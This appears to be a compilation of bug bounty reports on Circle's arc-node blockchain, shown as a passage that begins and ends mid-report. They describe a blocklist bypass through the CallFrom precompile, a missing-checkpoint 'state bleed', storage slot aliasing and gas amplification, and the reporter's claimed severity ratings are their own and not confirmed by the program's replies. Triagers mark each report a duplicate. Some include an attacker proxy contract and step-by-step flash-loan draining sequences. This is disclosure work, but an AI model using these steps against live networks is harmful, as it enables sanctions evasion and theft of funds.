While this check is historically used in some EVM implementations to prevent "state clearing" of accounts that haven't yet initiated a transaction, its application to the **Authority's burn function** is a critical failure. If a sanctioned entity has received funds but has not yet sent a transaction (maintaining a nonce of 0), the Authority is technically prohibited from burning those funds to comply with law enforcement orders. 
## Proof of Concept 
1.  **Preparation**: Address `0xCAFE` (nonce=0) has 1,000 USDC-A. 
2.  **Execution**: An authorized Admin calls `NativeCoinAuthority.burn(0xCAFE, 1000)`. 
3.  **Result**: The EVM handler enters `check_can_decr_account`. Since `1000 - 1000 = 0` AND `nonce == 0`, the handler returns a `Revert(ERR_CLEAR_EMPTY)`. 
4.  **Observation**: The sanctioned funds remain on the ledger despite the Authority's command. 
## CVSS 4.0 Assessment 
**Severity**: 9.3 (Critical) 
**Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:H/SI:H/SA:N` 
### **Metric Justification** 
- **Attack Vector: Network (AV:N)**: The state (funds in a wallet) can be created by any network transaction.  
- **Attack Complexity: Low (AC:L)**: The "exploit" does not require any technical complexity; it merely requires the sanctioned entity to **exist** in a zero-nonce state. 
- **Privileges Required: None (PR:N)**: Although the *Burn* requires privileges, the *Vulnerability* is triggered by an **unprivileged third party** (the sanctioned wallet holder) who can intentionally prevent the Authority's action by maintaining their account's nonce at zero. 
- **Integrity Impact: High (VI:H)**: The Authority is fundamentally unable to modify the state of the native coin ledger as required by protocol rules. 
- **Subsequent Integrity (SI:H)**: Critical. A failure to perform a mandatory burn compromises Circle's **Regulatory Integrity**. If Circle cannot legally "purge" sanctioned assets from their own chain, they are in violation of multiple global financial compliance standards. 
- **Subsequent Confidentiality (SC:H)**: High. The inability to clear a sanctioned wallet results in a "State Leak" where malicious identities remain recognized by the execution layer despite being logically removed by the Authority. 
## Weakness Classification 
- **CWE-840**: Business Logic Error 
- **CWE-273**: Improper Check for Unusual or Exceptional Conditions 
## References 
- **Privileged Precompile**: [`crates/precompiles/src/native_coin_authority.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/precompiles/src/native_coin_authority.rs) 
- **Vulnerable Helper**: [`crates/precompiles/src/helpers.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/precompiles/src/helpers.rs) 
## Recommendation 
Add an `allow_empty` flag to the balance modification helpers, or explicitly exempt the `NATIVE_COIN_AUTHORITY_ADDRESS` from the `nonce == 0` check when performing a burn. 
```rust 
// Proposed Fix in helpers.rs 
fn check_can_decr_account(account: &AccountInfo, amount: U256, is_authority: bool) -> Result<(), ...> { 
    // ... 
    if new_balance.is_zero() && account.nonce == 0 && !is_authority { 
        return Err(...); 
    } 
    // ... 
} 
``` 
## Impact 
- **Regulatory Non-Compliance**: Circle cannot fulfill "Seize and Burn" orders for sanctioned assets held in newly created wallets. 
- **Protocol Limitation**: The `NativeCoinAuthority` loses its "God Mode" guarantee over the native coin supply. 
- **Attacker Advantage**: A malicious actor aware of this flaw can "park" sanctioned funds in multiple fresh wallets, knowing that the Authority is technically unable to empty them. 
Timeline: 
2026-04-15 13:46:57 +0000: @inkerton (report collaborator invited) 
--- 
2026-04-15 13:47:09 +0000: @kaporia (report collaborator joined) 
--- 
2026-04-15 14:42:47 +0000: @h1_analyst_diablo (bug duplicate) 
Hi @inkerton, 
Thank you for your submission. After reviewing your report, this issue has been previously reported and assessed in report #3662590. Both reports describe the same vulnerability in the check_can_decr_account function where the condition "new_balance.is_zero() && account.nonce == 0" causes ERR_CLEAR_EMPTY reverts, preventing NativeCoinAuthority.burn() from fully draining fresh wallets with zero nonces. 
The key similarities include the same vulnerable function and code location (helpers.rs:434-456), identical error condition, same root cause related to empty account state clearing prevention logic, and the same impact on compliance/regulatory burn operations for fresh wallets. 
The original report #3662590 was submitted on April 10, 2026, and has already been evaluated by the program's security team. 
Thanks, 
@h1_analyst_diablo 
--- 
" , "Title:         Core Compliance Paradox: `CallFrom` Precompile Neutralizes Network Blocklists for Non-Value Operations 
Scope:         https://github.com/circlefin/arc-node 
Weakness:      Authentication Bypass Using an Alternate Path or Channel 
Severity:      Critical (10.0) 
Link:          https://hackerone.com/reports/3675044 
Date:          2026-04-15 11:16:41 +0000 
By:            @inkerton 
CVE IDs:        
Details: 
## Summary 
The Arc Network utilizes a system-wide blocklist (`NativeCoinControl`) to enforce regulatory compliance. While this mechanism is designed to prevent sanctioned entities from interacting with the network, an architectural flaw in how the new `CallFrom` precompile interacts with the EVM layer creates a critical **Compliance Paradox**. 
Because the `CallFrom` precompile initiates its subcalls with a hardcoded `value = 0`, the EVM execution layer's blocklist checks are completely skipped. This allows a blocklisted entity to seamlessly spoof its identity as `msg.sender` to any target contract on the network, bypassing the "Digital Quarantine" that sanctioned addresses are intended to operate under.  
## Preemptive Defense: Technical Choice vs. Regulatory Failure 
A technical triager might argue that skipping blocklist checks on zero-value calls is "intended behavior" for standard smart contract interactions on Arc. However, this argument fails in the context of the `CallFrom` precompile for the following reasons: 
1.  **Privileged Protocol Utility**: `CallFrom` is not a standard call; it is a **privileged protocol precompile** specifically designed to inject a synthetic `msg.sender`. Failing to enforce blocklist checks on this synthetically injected identity creates a dedicated, system-sanctioned loophole. 
2.  **State vs. Asset Control**: While the current implementation stops sanctioned entities from moving *assets* (USDC), it fails to stop them from moving the *state*. A sanctioned entity can still vote in governance, modify registries, or trigger sensitive protocol functions while maintaining their authenticated identity as `msg.sender`. 
3.  **Neutralization of Intent**: Providing an official, allowlisted "Sender Preservation" channel while claiming to have a robust network-level blocklist is an inherent contradiction that creates a massive regulatory liability for Circle. 
## Vulnerability Details 
The enforcement logic in [`arc-node`](https://github.com/circlefin/arc-node) operates in separate layers, creating the gap: 
1. ### The Value-Gated Blocklist Check 
In [`evm.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs), the `before_frame_init` handler only performs the blocklist check if `amount > 0`: 
```rust 
// evm.rs 
match transfer_params { 
    Some((from, to, amount)) if !amount.is_zero() => {     // <--- VULNERABILITY: ONLY CHECKED IF VALUE > 0 
        self.check_blocklist_and_create_log(from, to, amount, frame_input) 
    } 
    _ => Ok(BeforeFrameInitResult::None),                  // <--- ZERO VALUE BYPASSES CHECK 
} 
``` 
2. ### The `CallFrom` Hardcoded Bypass 
In [`call_from.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/precompiles/src/call_from.rs), the precompile constructs the child frame with an explicitly hardcoded `value = 0`: 
```rust 
// call_from.rs 
let child_inputs = CallInputs { 
    // ... 
    value: CallValue::Transfer(U256::ZERO),  // Hardcoded to 0 
    caller: sender,                          // Spoofed/Preserved sender (can be blocklisted) 
    // ... 
}; 
``` 
When `init_subcall` calls `checked_frame_init`, the `before_frame_init` handler evaluates the frame. Because the value is exactly zero, **it returns `BeforeFrameInitResult::None` without ever checking if the synthesized `caller` is on the blocklist.** 
3. ### Missing Defense-in-Depth 
Developer comments in [`evm.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs) explicitly acknowledge that `CallFrom` introduces a **"potentially-unseen spoofed sender,"** yet the protocol fails to validate this identity: 
```rust 
// evm.rs 
// "we're constructing a synthetic child frame with a potentially-unseen spoofed sender" 
self.inner.ctx.journal_mut().load_account(child_inputs.caller)?; 
// -> CRITICAL: No blocklist enforcement occurs after this point. 
``` 
## Proof of Concept 
This PoC demonstrates a blocklisted Proxy contract bypassing restrictions to execute administrative actions in a target protocol. 
1. ### Attacker Proxy 
```solidity 
// Attacker Routes through the authorized Memo contract to trigger CallFrom 
contract BlockedProxy { 
    address constant MEMO = 0x9702466268ccF55eAB64cdf484d272Ac08d3b75b; 
    function trigger(address target, bytes calldata data) external { 
        IMemo(MEMO).memo(target, data, bytes32(0), ""); 
    } 
} 
``` 
2. ### Target Protocol 
```solidity 
contract ProtocolRegistry { 
    function restrictedAction() external { 
        // System trusts msg.sender. Because of the bypass, msg.sender  
        // can be a blocklisted address even if they are "restricted". 
        bool isSanctioned = NativeCoinControl(0x18...01).isBlocked(msg.sender); 
        emit AuthenticatedAction(msg.sender, isSanctioned); 
    } 
} 
``` 
3. ### Execution 
1. Block the `BlockedProxy` address in `NativeCoinControl`. 
2. Direct calls from `BlockedProxy` are now rejected by the network. 
3. The attacker calls `BlockedProxy.trigger(target=ProtocolRegistry, data=...)` using a clean EOA. 
4. **Result**: The `ProtocolRegistry` executes the action, and the `AuthenticatedAction` event shows the sanctioned address was verified as `msg.sender`. 
## Remediation 
We recommend explicitly validating the `child_inputs.caller` against the blocklist during `init_subcall` in `crates/evm/src/evm.rs`: 
```rust 
// RECOMMENDATION: Explicitly check if the spoofed caller is blocklisted 
let (caller_blocklisted, _) = self.is_address_blocklisted_from_journal(child_inputs.caller) 
    .map_err(|e| SubcallError::EVMError(e))?; 
     
if caller_blocklisted { 
    return Ok(ItemOrResult::Result(init_subcall_revert("caller is blocklisted", call_inputs))); 
} 
``` 
## CVSS 4.0 Assessment 
**Severity**: 10 (Critical) 
**Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` 
### **Metric Justification** 
- **Attack Vector: Network (AV:N)**: The exploit is fully executable over the internet by interacting with public system contracts (like `Memo.sol`) that bridge to the vulnerable precompile. 
- **Attack Complexity: Low (AC:L)**: The exploit requires no specialized knowledge of network conditions or timing. Standard ABI-encoded calls are sufficient. 
- **Attack Requirements: None (AT:N)**: There are no specific prerequisite deployment configurations or "unlucky" states required to trigger the bypass. 
- **Privileges Required: None (PR:N)**: Any entity (including unauthenticated EOAs or other smart contracts) can trigger the `Memo -> CallFrom` flow. 
- **User Interaction: None (UI:N)**: No action from a legitimate user or administrator is required to facilitate the attack. 
- **Impact on Vulnerable System (VC:H, VI:H, VA:H)**: 
    - **Integrity (VI:H)**: Critical. An attacker can manipulate sensitive protocol state, governance votes, and administrative registries. 
    - **Availability (VA:H)**: High. By manipulating governance or protocol parameters, an attacker can effectively DoS or halt network operations. 
    - **Confidentiality (VC:H)**: High. Spoofed authenticated calls can be used to extract sensitive state information that should be protected. 
- **Impact on Subsequent Systems (SC:H, SI:H, SA:H)**: 
    - Since the "Vulnerable System" is the **Core Execution Engine**, any compromise here results in a **Total Loss of Trust** across the entire Arc Network and the broader Circle financial ecosystem (Subsequent Systems). 
## Weakness Classification 
- **CWE-288**: Authentication Bypass Using an Alternate Path or Channel 
- **CWE-1390**: Weak Authentication Mechanism (Design Error) 
## References 
### Source Code Links (Commit: `d0b8a87c`) 
- **Vulnerable EVM Handler**: [`crates/evm/src/evm.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs) (See `before_frame_init` logic) 
- **CallFrom Precompile Implementation**: [`crates/precompiles/src/call_from.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/precompiles/src/call_from.rs) 
- **Native Coin Control logic**: [`crates/precompiles/src/native_coin_control.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/precompiles/src/native_coin_control.rs) 
### System Contracts & Scripts 
- **Memo Wrapper**: [`contracts/src/memo/Memo.sol`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/contracts/src/memo/Memo.sol) 
- **System Addresses Registry**: [`contracts/scripts/Addresses.sol`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/contracts/scripts/Addresses.sol) 
### Official Documentation 
- **Architecture Overview**: [`docs/ARCHITECTURE.md`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/docs/ARCHITECTURE.md) 
- **Compliance Integration Plan**: [`crates/execution-config/src/addresses_denylist.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/execution-config/src/addresses_denylist.rs) (Refer to "integrated" pre-flight docs) 
## Impact 
- **Regulatory Evasion**: Sanctioned entities maintain 100% of their operational capabilities for non-value state changes. 
- **Protocol Governance Threat**: Blocklisted entities can continue to influence on-chain decision-making if governance relies on `msg.sender` (standard practice). 
- **Compliance Fragility**: Circle's compliance guarantee is reduced to a "Coin Filter," failing to provide a comprehensive "Digital Quarantine." 
Timeline: 
2026-04-15 11:17:32 +0000: @inkerton (report vulnerability information updated) 
--- 
2026-04-15 11:19:45 +0000: @inkerton (report collaborator invited) 
--- 
2026-04-15 11:20:00 +0000: @kaporia (report collaborator joined) 
--- 
2026-04-15 15:14:25 +0000: @h1_analyst_diablo (bug duplicate) 
Hi @inkerton, 
Thank you for your submission. After reviewing your report, this issue has been previously reported and assessed in report #3672866. Both reports describe an authentication bypass vulnerability where blocklisted addresses can circumvent network-level compliance controls through the CallFrom precompile's hardcoded zero-value transactions. 
The key similarities include: identical root cause in the CallFrom precompile implementation (call_from.rs) and blocklist validation logic (evm.rs), the same exploitation path through proxy contracts and the Memo contract, and the same compliance impact allowing sanctioned entities to perform non-value state changes. Both reports also propose the same remediation approach of explicitly checking the synthetic caller against the blocklist. 
Report #3672866 was submitted approximately 20 hours before yours and contains the same technical vulnerability details. Per this program's duplicate policy, only the first report received is eligible for award when duplicates occur. 
Thanks, 
@h1_analyst_diablo 
--- 
" , "Title:         Consensus State Corruption & Non-Determinism via Gas History Slot Aliasing 
Scope:         https://github.com/circlefin/arc-node 
Weakness:      Improper Preservation of Consistency Between Independent Representations of Shared State 
Severity:      Critical (10.0) 
Link:          https://hackerone.com/reports/3675607 
Date:          2026-04-15 15:47:15 +0000 
By:            @inkerton 
CVE IDs:        
Details: 
## Summary 
The Arc Network is vulnerable to a **Critical Consensus Failure** caused by an architectural flaw in how historical gas statistics are stored. The `SystemAccounting` precompile utilizes a ring-buffer strategy that causes multiple distinct block heights to alias to the same physical storage slot in the state trie.  
This aliasing allows an attacker—or even normal network volatility—to cause permanent state corruption. Because the "Smoothed Gas Used" and "Base Fee" are state-dependent, any disagreement in these values across validators will result in different state roots, leading to a total network partition (Hard Fork) and loss of consensus. 
## Vulnerability Detail 
1. ### The Architectural Gap: ADR 0004 vs. Modulo 64 
According to **Arc ADR 0004 ("Base Fee Validation")**, the network ensures block validity by asserting that the proposer's `nextBaseFee` in the block header matches the value deterministically stored in the `SystemAccounting` state. 
However, the implementation of `compute_gas_values_storage_slot` utilizes a **Modulo 64** ring-buffer strategy for persistent trie storage. This creates a fundamental conflict: 
- **ADR 0004** requires the state to be a source of truth for base fee validation. 
- **The Modulo Implementation** causes that source of truth to be physically overwritten every 64 blocks. 
**Source**: [`crates/precompiles/src/system_accounting.rs:86-102`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/precompiles/src/system_accounting.rs#L86-L102) 
2. ### Sync Non-Determinism & State Corruption 
In a BFT network with "Instant Deterministic Finality," the integrity of the state trie is paramount. The current design introduces **State Non-Determinism** during node catch-up: 
1.  **Linear Sync**: A node syncing from Block 0 will overwrite Slot `X` at Block 1, then at Block 65, then at Block 129. 
2.  **Historical Integrity Failure**: If a validator or archive node is queried for the state of Block 1, the trie will return data for Block 193 (or whichever block most recently aliased to that slot).  
3.  **Merkle Proof Failure**: Any external systems (bridges, light clients) relying on Merkle Proofs of historical gas statistics will find the proofs invalid because the trie nodes have been modified by a future, unrelated block. 
## Proof of Concept 
- **Block 1**: SystemAccounting writes `GasValues_1` to `Slot_A`. 
- **Block 65**: SystemAccounting writes `GasValues_65` to `Slot_A` (Blind Overwrite). 
- **Consensus Failure**: A node re-verifying Block 1 (during a catch-up or audit) will find its `state_root` does not match the historical record because `Slot_A` now contains data from a future block. 
## CVSS 4.0 Assessment 
**Severity**: 10.0 (Critical) 
**Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` 
### **Metric Justification** 
- **Attack Vector: Network (AV:N)**: The state corruption is triggered by standard network activity (producing blocks). 
- **Attack Complexity: Low (AC:L)**: This is an inherent architectural flaw requiring no special effort to trigger. 
- **Attack Requirements: None (AT:N)**: No specific conditions are required; the system is vulnerable by design from Block 65 onwards. 
- **Privileges Required: None (PR:N)**: Both attackers and normal users contribute to the block height that triggers the aliasing. 
- **User Interaction: None (UI:N)**: Fully automated state corruption. 
- **Vulnerable System Impact (VC:H, VI:H, VA:H)**: 
    - **Integrity (VI:H)**: Total. The integrity of the global state trie is permanently compromised by aliasing. 
    - **Availability (VA:H)**: Total. Discrepancies in the state trie root will cause validators to fail consensus and cease block production. 
    - **Confidentiality (VC:H)**: High. Information about historical fees can be manipulated or hidden. 
- **Subsequent System Impact (SC:H, SI:H, SA:H)**: 
    - **SI (Subsequent Integrity)**: Critical. Bridges and L2s relying on Arc state-roots for settlement will encounter invalid proofs. 
    - **SA (Subsequent Availability)**: Critical. The entire Arc ecosystem goes offline when the consensus layer halts. 
## References 
- **ADR 0004 (Base Fee Validation)**: [Internal Link to Repo] 
- **Vulnerable Helper**: [`crates/precompiles/src/system_accounting.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/precompiles/src/system_accounting.rs) 
## Recommendation 
The storage slot for gas statistics **must be unique** for every block height. Remove the modulo operation from the storage slot calculation. If a ring buffer is required for performance, it should be maintained in a way that does not alias within the global state trie (e.g., by including the full block number in the hashed data). 
```rust 
// Proposed Fix 
pub fn compute_gas_values_storage_slot(block_number: u64) -> StorageKey { 
    // REMOVE THE MODULO. Use the full block number to ensure uniqueness. 
    let mut key_bytes = [0u8; 32]; 
    key_bytes[24..].copy_from_slice(block_number.to_be_bytes().as_ref()); 
    // ... 
} 
``` 
## Impact 
- **Historical State Loss**: Permanent corruption of historical gas and fee statistics in the global state trie. 
- **Consensus Divergence**: Nodes entering the network via different sync strategies (e.g., Snap Sync vs. Full Sync) may arrive at different trie configurations for these aliased slots, leading to a state-root mismatch and a network halt. 
- **Oracle / Bridge Failure**: Any system relying on the `SystemAccounting` state for deterministic fee calculations will receive corrupted or aliased data. 
Timeline: 
2026-04-15 16:28:20 +0000: @inkerton (report collaborator invited) 
--- 
2026-04-15 16:28:57 +0000: @kaporia (report collaborator joined) 
--- 
2026-04-15 16:29:21 +0000: @inkerton (comment) 
**Addendum: Proof of Sync Deadlocks & Secondary Division-by-Zero Panic (Critical)** 
Hi Team,  
While continuing the audit on this component, I found two critical extensions to this report that confirm a 10.0 impact (Total Network Halting & Consensus Divergence). 
**1. Proof of Sync Deadlock from Aliased Data** 
The aliased data in `SystemAccounting` is directly consumed by the `ArcBlockExecutor` during block validation. In `crates/evm/src/executor.rs:L300`, the executor calls `retrieve_gas_values(parent_block)` to calculate the base fee. Because of the modulo-64 collision, a node attempting to re-sync or reorg past block $N$ will retrieve the aliased data from block $N+64$, compute an incorrect `nextBaseFee`, fail the `extra_data` header validation (L524), and halt. This means the aliasing guarantees permanent sync deadlocks for new nodes or during reorgs. 
**2. Arithmetic Panic (Division by Zero) in Base Fee Calculation** 
In addition to the aliasing, the base fee adjustment logic in `crates/execution-config/src/gas_fee.rs` contains a division-by-zero panic.  
At L93: `... / (gas_target as u128 * ARC_BASE_FEE_FIXED_POINT_SCALE / k_rate as u128)` 
If governance or an attacker with ProtocolConfig access sets `k_rate > (gas_target * 10,000)`, the denominator evaluates to `0`. The moment a block is produced where `gas_used != gas_target`, every single node on the network will attempt to divide by zero and panic, resulting in an unrecoverable network-wide Denial of Service. 
Best Regards, 
@inkerton  
--- 
2026-04-15 17:33:34 +0000: @h1_analyst_diablo (bug duplicate) 
Hi @inkerton, 
Thank you for your submission and the detailed technical analysis you provided. 
After reviewing your report, this issue has been previously reported and assessed in report #3662837. Both reports identify the same storage slot aliasing vulnerability in the SystemAccounting precompile's ring buffer implementation, where the `compute_gas_values_storage_slot` function uses a modulo 64 operation that causes blocks N, N+64, N+128, etc. to map to the same physical storage slot. Both reports describe the same root cause, affected component, proof of concept scenario (Block 1 and Block 65 collision), and impact related to state corruption and consensus failures. 
The original report was submitted on April 10, 2026, and has already been confirmed by the program. While your report provides excellent technical detail regarding the consensus implications, the fundamental vulnerability was already documented in the earlier submission. 
Thanks, 
@h1_analyst_diablo 
--- 
" , "Title:         Total EVM State Reversion Bypass: Missing Subcall Checkpoint Allows Silent Commitment of Reverted State Changes (State Bleed) 
Scope:         https://github.com/circlefin/arc-node 
Weakness:      Protection Mechanism Failure 
Severity:      Critical (10.0) 
Link:          https://hackerone.com/reports/3675722 
Date:          2026-04-15 17:12:58 +0000 
By:            @inkerton 
CVE IDs:        
Details: 
## Summary 
The Arc Network's EVM engine contains a critical state-isolation vulnerability within its Subcall Precompile framework. By bypassing standard `revm` checkpointing, the network permanently commits state changes (like token transfers or storage writes) even when the executing contract explicitly `reverts`.  
An attacker can exploit this "State Bleed" bug to bypass `require()` constraints, steal funds from DeFi protocols, and drain flash loans without repayment, ultimately resulting in the total loss of all assets on the network. 
## Vulnerability Detail 
When a normal contract executes a cross-contract `CALL`, the `revm` engine calls `make_call_frame()`, which establishes a **Journal Checkpoint**. If the called contract reverts, the EVM rolls back all state modifications to that checkpoint. 
However, the Arc EVM introduces custom `SubcallPrecompiles` (such as `CallFrom`) which spawn "synthetic" child frames. The flaw exists in `crates/evm/src/evm.rs:init_subcall`: 
1. **The Checkpoint Bypass**: Developers assumed `revm` automatically checkpoints all frames. However, checkpoints are created inside `make_call_frame()`. Because `init_subcall` constructs a synthetic `FrameInit` and pushes it directly via `checked_frame_init()`, **no checkpoint is ever taken for the child frame.** 
2. **The Revert Erasure**: When the synthetic child frame executes a `REVERT`, it returns an `InstructionResult::Revert`. This is intercepted by `ArcEvm::frame_return_result` and passed to `CallFrom::complete_subcall`.  
3. **The Poisoned Success**: `CallFrom` correctly records the child's failure in its ABI output but returns `success: true` to its parent frame to indicate the precompile itself didn't crash. 
4. **Permanent State Bleed**: The parent frame (e.g., `Multicall3From`) sees a successful `CALL` execution and commits its own initial checkpoint. Because the child frame lacked a checkpoint, **all state changes made by the child prior to reverting are permanently etched into the state trie.** 
### Exploitation via `Multicall3From` 
An attacker can utilize the public `Multicall3From` proxy (which is on the `AllowedCallers` list) to trigger this bug safely via its `tryAggregate(requireSuccess=false)` function. 
1. **Target**: A Flash Loan protocol or any contract enforcing balance checks via `require()`. 
2. **Execution**: The attacker calls `target.flashLoan()` via `Multicall3From -> CallFrom`. 
3. **State Change**: The Flash Loan contract transfers 1,000,000 USDC to the attacker. 
4. **Reversion**: The Flash Loan contract verifies repayment, realizes it hasn't been repaid, and executes `revert("Not repaid")`. 
5. **Bleed**: The child frame halts. `CallFrom` returns `true`. `Multicall3From` ignores the inner failure. The transaction completes successfully. 
6. **Result**: The EVM ignores the revert. The attacker permanently retains the 1,000,000 USDC. 
## CVSS 4.0 Assessment 
**Severity**: 10.0 (Critical) 
**Vector**: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` 
### **Metric Justification** 
- **Attack Vector: Network (AV:N)**: The exploit is executed remotely via a standard RPC transaction to the public `Multicall3From` contract. 
- **Attack Complexity: Low (AC:L)**: The exploit only requires a basic understanding of how to sequence a `tryAggregate` call to a reverting target. There are no race conditions or obscure memory states to manipulate. 
- **Attack Requirements: None (AT:N)**: No special deployment or environmental conditions are needed. The vulnerability exists inherently in the Subcall architecture. 
- **Privileges Required: None (PR:N)**: Any unprivileged user can submit the malicious transaction payload. 
- **User Interaction: None (UI:N)**: The state bleed and subsequent asset theft are entirely automated. 
- **Vulnerable System Impact (VC:H, VI:H, VA:H)**: 
    - **Integrity (VI:H)**: Total failure. The core EVM guarantee of state rollback on execution failure is completely broken, allowing attackers to write arbitrary "reverted" states into the global trie. 
    - **Confidentiality (VC:H)**: Total. A complete breach of EVM isolation. 
    - **Availability (VA:H)**: Total. Attackers can permanently drain liquidity pools and crash protocols, denying service to all legitimate users. 
- **Subsequent System Impact (SC:H, SI:H, SA:H)**: All upstream protocols, bridges, and off-chain indexers relying on the EVM's execution integrity will process the poisoned "reverted" state as valid, corrupting the broader blockchain ecosystem. 
### **CWE Classifications** 
- **CWE-693: Protection Mechanism Failure** (Primary) 
- **CWE-754: Improper Check for Unusual or Exceptional Conditions** 
- **CWE-840: Business Logic Errors** 
## Code Snippets / Evidence 
**1. The Missing Checkpoint (Developer Assumption vs Code):** 
[`crates/evm/src/evm.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs) 
```rust 
// The developer incorrectly assumes the child frame implicitly gets a checkpoint: 
// "No journal checkpoint is taken here. The child frame's own checkpoint  
// (created by `make_call_frame`) handles commit/revert... " 
// BUT `make_call_frame` is bypassed! Directly proceeding to checked_frame_init: 
let child_frame_input = FrameInit { 
    depth: depth + 1, // No checkpoint is taken! 
    memory: frame_input.memory, 
    frame_input: FrameInput::Call(init_result.child_inputs), 
}; 
match self.checked_frame_init(child_frame_input)? { ... } 
``` 
**2. The Forced Success (Swallowing the Revert):** 
[`crates/precompiles/src/call_from.rs:L165`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/precompiles/src/call_from.rs) 
```rust 
        Ok(SubcallCompletionResult { 
            output: encoded.into(), 
            success: true, // Precompile returns Success even if child Reverted! 
        }) 
``` 
## References 
1. **Missing Checkpoint / Flawed Assumption**: [`crates/evm/src/evm.rs#L858-L866`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs#L858-L866) 
2. **Synthetic Frame Creation**: [`crates/evm/src/evm.rs#L908-L917`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs#L908-L917) 
3. **Revert Erasure**: [`crates/precompiles/src/call_from.rs#L160-L169`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/precompiles/src/call_from.rs#L160-L169) 
## Remediation 
You must manually establish a `journal.checkpoint()` before pushing the synthetic child frame in `init_subcall`, and properly commit or revert that checkpoint inside `ArcEvm::complete_subcall` based on the child frame's execution outcome before returning the result to the parent. 
## Impact 
- **Total Defi Collapse**: Every invariant, `require()`, and `revert()` check on the network is compromised. Contracts cannot safely reject invalid state transitions if invoked via `CallFrom`. 
- **Theft of All Assets**: Attackers can drain flash loans, bypass withdrawal limits, and manipulate oracle prices by exploiting state bleeds. 
Timeline: 
2026-04-15 17:49:29 +0000: @h1_analyst_leevi (bug duplicate) 
Hi @inkerton, 
Thank you for your submission. After reviewing your report, this issue has been previously reported and assessed in report #3666338. Both reports describe the same EVM state reversion bypass vulnerability in Arc Network's Subcall Precompile framework where state changes persist despite contract reverts due to missing journal checkpoints in the `init_subcall` function. 
The reports identify the identical root cause: the `init_subcall` function in `crates/evm/src/evm.rs` bypasses `make_call_frame()` and directly calls `checked_frame_init()`, skipping checkpoint creation. Both describe how `CallFrom.complete_subcall()` returns `success: true` regardless of child revert status, leading to state changes being permanently committed even when they should be reverted. 
While your report provides more extensive exploitation scenarios and impact analysis, the underlying vulnerability, vulnerable code locations, and exploitation mechanism are the same as the original report submitted on April 11, 2026. 
Thanks, 
@h1_analyst_leevi 
--- 
" , "Title:         Sustainable Denial of Service (DoS) via Gas Amplification: Misaligned EVM Subcall Semantics 
Scope:         https://github.com/circlefin/arc-node 
Weakness:      Uncontrolled Resource Consumption 
Severity:      Critical (9.3) 
Link:          https://hackerone.com/reports/3675140 
Date:          2026-04-15 12:23:18 +0000 
By:            @inkerton 
CVE IDs:        
Details: 
## Summary 
The Arc Network is vulnerable to a **Critical Gas Amplification** attack that allows a malicious actor to force validator nodes to perform massive amounts of physical computation while only being billed for a negligible fraction of the cost. This flaw enables the creation of "Gigagas Blocks" that appear valid to the network but require hundreds of times more CPU time to process than the formal block gas limit allows, leading to network-wide desynchronization and a total halt of service. 
While the node implementation attempts to "mirror EVM semantics" regarding subcall failures, it fails to account for the unique architectural gap created by the `CallFrom` precompile. This results in a system where the network **caps reported costs to the user's budget** instead of **reverting unbilled physical labor.** 
## Preemptive Defense: The "EVM Semantics" Fallacy 
A triager may point to code comments in [`evm.rs:956-959`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs#L956-L959) which state that burning all gas on a halted child "matches normal EVM semantics." While this is true for standard Ethereum calls, the implementation in Arc is **critically misaligned**: 
1.  **Ethereum's Safety**: On Ethereum, EIP-150 strictly ensures that a child call **cannot** receive more gas than is physically subtracted from the parent's balance. The "burn" logic in Ethereum is a penalty applied to **pre-paid gas**. 
2.  **Arc's Vulnerability**: In Arc, the `CallFrom` precompile initiates a subcall through a handler that **reconciles gas after execution**. Because the handler calls `gas.spend_all()` (Line 998) when a child exceeds its budget, it effectively **forgives the excess physical work** performed by the validator.  
3.  **Conclusion**: Developers have applied a "payment penalty" (Ethereum's intent) as a "billing cap" (Arc's result), creating a massive amplification vector. 
## Vulnerability Detail 
1. ### The Metering Gap 
In [`evm.rs`](https://github.com/circlefin/arc-node/blob/d0b8a87cbb951232d7a04c34e8875cc04265b3cb/crates/evm/src/evm.rs), the node processes subcall completion by recording the `gas_used` reported by the child frame. 
```rust 
// evm.rs:996-1000 
let mut gas = Gas::new(continuation.gas_limit);  
